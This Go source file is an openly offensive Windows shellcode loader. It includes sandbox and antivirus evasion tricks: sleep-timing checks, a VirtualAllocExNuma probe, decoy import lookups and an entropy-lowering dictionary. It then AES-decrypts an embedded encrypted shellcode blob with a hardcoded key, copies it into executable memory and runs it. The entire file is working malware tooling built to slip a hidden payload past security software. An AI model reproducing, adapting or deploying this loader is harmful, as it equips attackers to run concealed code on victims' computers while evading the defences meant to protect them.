package main

// importing the required packages
import (
	"crypto/aes"
	"crypto/cipher"
	_ "embed"
	"fmt"
	"syscall"
	"time"
	"unsafe"
)

// Constants for memory allocation and protection
const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	TIOCGWINSZ             = 0x5413
	SYS_IOCTL              = 0x541B
)

// aesDecrypt decrypts the given ciphertext using the given key and IV
func aesDecrypt(ciphertext, key, iv []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println("aes.NewCipher failed:", err)
		return nil
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(ciphertext, ciphertext)
	return ciphertext
}

func boxElder() {
	// Sleep for 4 seconds to evade AV detection. Some AVs will skip the sleep and we can detect them by checking the time elapsed between the two time.Now() calls below.
	// If the time elapsed is less than 3.5 seconds, we can assume that the AV skipped the sleep and we can exit the process.
	firstTime := time.Now()
	time.Sleep(4 * time.Second)
	timeTwo := time.Now()
	elapsed := timeTwo.Sub(firstTime)
	if elapsed.Seconds() < 3.5 {
		syscall.Exit(1)
	}

	// VirtualAllocExNuma is a function that is not present in all Windows versions.
	// If the function is not found, we can assume that we are in a VM and exit the process
	vExNuma := syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualAllocExNuma")
	vExNuma.Call(0, 0x1000, 0x3000, 0x40, 0x4, 0x0)
	if vExNuma.Find() != nil {
		fmt.Println("VirtualAllocExNuma not found!")
		syscall.Exit(1)
	}

	// Get the GetTickCount function from the kernel32 DLL
	getTickCount := syscall.NewLazyDLL("kernel32.dll").NewProc("GetTickCount")
	// Call the GetTickCount function to check if the process is running in a sandbox
	tickCount, _, _ := getTickCount.Call()
	if tickCount == 0 {
		// If the process is running in a sandbox, we can assume that the process is being analyzed and exit the process
		syscall.Exit(1)
	}
}

func reverseString(s string) string {
	runes := []rune(s)
	for i, j := 0, len(runes)-1; i < j; i, j = i+1, j-1 {
		runes[i], runes[j] = runes[j], runes[i]
	}
	return string(runes)
}

func IatCamoflauge() {
	_ = syscall.NewLazyDLL("kernel32.dll").NewProc("IsDialogMessageW")
	_ = syscall.NewLazyDLL("kernel32.dll").NewProc("GetSystemTimeAsFileTime")
	_ = syscall.NewLazyDLL("kernel32.dll").NewProc("GetTickCount")
	_ = syscall.NewLazyDLL("kernel32.dll").NewProc("GetTickCount64")
	_ = syscall.NewLazyDLL("kernel32.dll").NewProc("GetSystemTime")
	_ = syscall.NewLazyDLL("kernel32.dll").NewProc("GetSystemTimeAdjustment")
	_ = syscall.NewLazyDLL("kernel32.dll").NewProc("GetSystemTimePreciseAsFileTime")
	_ = syscall.NewLazyDLL("kernel32.dll").NewProc("RegisterClassW")
	_ = syscall.NewLazyDLL("kernel32.dll").NewProc("IsWindowVisible")
	_ = syscall.NewLazyDLL("kernel32.dll").NewProc("GetSystemMetrics")
	_ = syscall.NewLazyDLL("kernel32.dll").NewProc("GetSystemMetricsForDpi")
	_ = syscall.NewLazyDLL("kernel32.dll").NewProc("GetWindowLongPtrW")
	_ = syscall.NewLazyDLL("kernel32.dll").NewProc("GetWindowContextHelpId")
	_ = syscall.NewLazyDLL("kernel32.dll").NewProc("SetCriticalSectionSpinCount")
	_ = syscall.NewLazyDLL("kernel32.dll").NewProc("MultiByteToWideChar")
}

func evadeAV() {
	// Call the boxElder function to perform sandbox detection
	boxElder()

	// Create a dictionary and reverse the letters to decrease entropy
	dictionary := map[string]string{
		"apple":    "a fruit",
		"car":      "a vehicle",
		"house":    "a place to live",
		"book":     "a written work",
		"chair":    "a piece of furniture",
		"dog":      "a pet animal",
		"tree":     "a woody plant",
		"water":    "a liquid substance",
		"music":    "an art form",
		"computer": "an electronic device",
		"phone":    "a communication device",
		"pizza":    "a type of food",
		"bird":     "a feathered animal",
		"pen":      "a writing instrument",
		"table":    "a piece of furniture",
		"sun":      "a star",
		"flower":   "a plant",
		"cloud":    "a visible mass of condensed water vapor",
		"shoe":     "a type of footwear",
		"door":     "an entry or exit",
		"beach":    "a sandy area near water",
		"mountain": "a large natural elevation",
		"bus":      "a type of vehicle",
		"pencil":   "a writing instrument",
		"jacket":   "an outer garment",
		"hat":      "a head covering",
		"umbrella": "a portable shelter",
		"lamp":     "a source of light",
		"clock":    "a timepiece",
		"cake":     "a sweet baked food",
		"guitar":   "a musical instrument",
		"bottle":   "a container for liquids",
		"ball":     "a round object used in games",
	}

	for key, value := range dictionary {
		reversedKey := reverseString(key)
		reversedValue := reverseString(value)
		dictionary[reversedKey] = reversedValue
		delete(dictionary, key)
	}

}

var shellcode = []byte{0x06, 0xB8, 0xBC, 0x00, 0x80, 0xCC, 0x2C, 0x1D, 0xC4, 0xED, 0x75, 0xA0, 0xF3, 0xE7, 0xB9, 0x90, 0x60, 0xE0, 0x8E, 0xE7, 0x69, 0xBA, 0x9F, 0x75, 0x1F, 0xC4, 0xF9, 0xC1, 0x84, 0x92, 0xBE, 0x9B, 0x88, 0x31, 0x42, 0x8C, 0xB1, 0xC9, 0xE0, 0x21, 0xC5, 0x19, 0x4A, 0x63, 0xC6, 0x1E, 0x70, 0xBA, 0x54, 0x1C, 0x8A, 0x89, 0x6A, 0x4E, 0x7B, 0x4F, 0x8C, 0x13, 0xB9, 0x21, 0x9C, 0x8E, 0x7A, 0xED, 0xBC, 0xCF, 0xE2, 0xA9, 0x28, 0x63, 0xE8, 0xBD, 0x75, 0x73, 0x8D, 0x65, 0x70, 0x43, 0xA6, 0xBC, 0x4D, 0xED, 0xE7, 0xE6, 0x7A, 0xA9, 0xB5, 0x7F, 0xA8, 0xC3, 0x9F, 0x0F, 0xAC, 0xA4, 0xE3, 0xDD, 0xA8, 0xFC, 0x3B, 0xD2, 0xE4, 0x77, 0x65, 0xAE, 0x00, 0xCB, 0x89, 0x36, 0x3A, 0x32, 0x63, 0xC4, 0x4B, 0x64, 0xF0, 0xB6, 0x41, 0xEF, 0xE3, 0x00, 0x9A, 0x9F, 0x13, 0x37, 0x70, 0x06, 0x05, 0x87, 0xB9, 0xFF, 0x1A, 0x85, 0x26, 0xC8, 0x43, 0x7B, 0x74, 0xD9, 0x43, 0x88, 0xA1, 0xAE, 0x4E, 0x81, 0xFF, 0x21, 0x44, 0xAF, 0x91, 0x8C, 0x82, 0x04, 0x81, 0x89, 0xD0, 0xAA, 0xEF, 0xAC, 0x1B, 0xCE, 0x52, 0x4A, 0xF5, 0xE5, 0xD1, 0x9A, 0x9B, 0x79, 0xAC, 0x34, 0x73, 0x32, 0x91, 0x24, 0x9F, 0x75, 0xBA, 0xA7, 0xE0, 0xB1, 0xF4, 0xB2, 0xA0, 0x90, 0x17, 0x68, 0x56, 0xFC, 0xFC, 0x9A, 0xD8, 0xF6, 0x41, 0x3B, 0xC8, 0xBC, 0xCD, 0xF2, 0xBB, 0xBE, 0xB9, 0xB3, 0xA1, 0x79, 0x59, 0xFA, 0x5B, 0x74, 0xD2, 0x42, 0x41, 0x0B, 0x37, 0x7D, 0xFC, 0x93, 0xFE, 0xF4, 0x8E, 0x57, 0x89, 0xFD, 0x00, 0x28, 0x91, 0x99, 0x64, 0x24, 0x33, 0x27, 0x15, 0x57, 0x01, 0xD2, 0xEA, 0x2E, 0x4A, 0x1B, 0x22, 0xF9, 0x07, 0xA4, 0xA5, 0xE0, 0x52, 0x98, 0xD8, 0x20, 0x0E, 0x95, 0x8F, 0xEB, 0xCD, 0x4A, 0x8C, 0xC7, 0x84, 0x8A, 0x4B, 0x6E, 0xB0, 0x0A, 0x14, 0x22, 0xAD, 0xA8, 0xCD, 0x1F, 0xFD, 0xEA, 0x44, 0x3B, 0xDE, 0x23, 0x41, 0x73, 0x0A, 0x85, 0xE2, 0x09, 0x0F, 0x34, 0xFE, 0x94, 0xD7, 0xE8, 0x88, 0x43, 0x38, 0x9C, 0xD3, 0xD6, 0x7A, 0x8E, 0xAC, 0x3E, 0x9A, 0xC4, 0x79, 0x04, 0x9F, 0x99, 0x92, 0x5C}

func main() {
	// Call the evadeAV function to evade AV detection
	evadeAV()

	//var faciconBytes []byte

	// Instantiate the kernel32 and ntdll DLLs
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	// Get the VirtualAlloc and RtlMoveMemory functions from the kernel32 and ntdll DLLs
	virtualAlloc := kernel32.NewProc("VirtualAlloc")
	rtlMoveMemory := ntdll.NewProc("RtlMoveMemory")

	// AES key and IV
	key := []byte{0x38, 0x86, 0xFE, 0x63, 0xF9, 0x53, 0xA3, 0x8F, 0x61, 0x95, 0xAD, 0x3E, 0x2E, 0xE3, 0xE9, 0x57,
		0xB9, 0xFE, 0xA3, 0x47, 0xCD, 0x56, 0x1A, 0xA3, 0xB9, 0xD0, 0x31, 0x0F, 0xA4, 0xC7, 0x67, 0x5E}
	iv := []byte{0xEF, 0xBC, 0xC7, 0x3D, 0x4A, 0x4B, 0x7C, 0x38, 0x4B, 0xB1, 0x52, 0xE1, 0x0F, 0x65, 0x72, 0x0D}

	// Allocate memory for the shellcode
	addr, _, err := virtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		fmt.Println("VirtualAlloc failed:", err)
		return
	}

	// Decrypt the shellcode
	shellcode = aesDecrypt(shellcode, key, iv)

	// Copy the shellcode to the allocated memory
	_, _, err = rtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if err != nil && err.Error() != "The operation completed successfully." {
		fmt.Println("RtlMoveMemory failed:", err)
		return
	}

	// Change the memory protection of the allocated memory to RX
	virtualProtect := kernel32.NewProc("VirtualProtect")
	oldProtect := uint32(0)
	_, _, err2 := virtualProtect.Call(addr, uintptr(len(shellcode)), syscall.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if err2 != nil {
		fmt.Println("VirtualProtect failed:", err2)
	}

	// Call the shellcode
	syscall.SyscallN(addr, 0, 0, 0, 0)
}
